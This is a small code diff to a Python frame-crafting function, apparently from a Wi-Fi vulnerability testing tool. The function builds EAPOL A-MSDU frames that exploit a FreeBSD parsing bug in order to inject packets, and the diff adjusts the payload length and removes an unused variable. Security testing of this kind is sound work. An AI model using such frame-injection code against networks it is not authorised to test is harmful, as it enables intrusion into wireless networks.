@@ -48,12 +48,11 @@ def freebsd_create_eapolmsdu(src, dst, toinject):
 	"""
 
 	# Subframe 1: LLC/SNAP for EAPOL. The X's will be part of the first subframe.
-	rawmac = bytes.fromhex(src.replace(':', ''))
 	prefix = raw(LLC()/SNAP()/EAPOL()) + b"XXXXXXXX"
 
 	# Subframe 1: content will be the X's (excluding the first 6 bytes). The actual
 	#	ethernet payload length will be payload_len - 16 due to parsing bugs.
-	payload_len = 17
+	payload_len = 16
 	total_len   = payload_len + 6 + 6 + 2
 	padding_len = 4 - (total_len % 4) if total_len % 4 != 0 else 0
 	payload = prefix + struct.pack(">H", payload_len) + payload_len * b"X" + padding_len * b"Y"
@@ -78,7 +77,6 @@ def freebsd_encap_eapolmsdu(p, src, dst, payload):
 
 	p = p/freebsd_create_eapolmsdu(src, dst, payload)
 	return p
-
 
 # ----------------------------------- Vulnerability Tests -----------------------------------
 
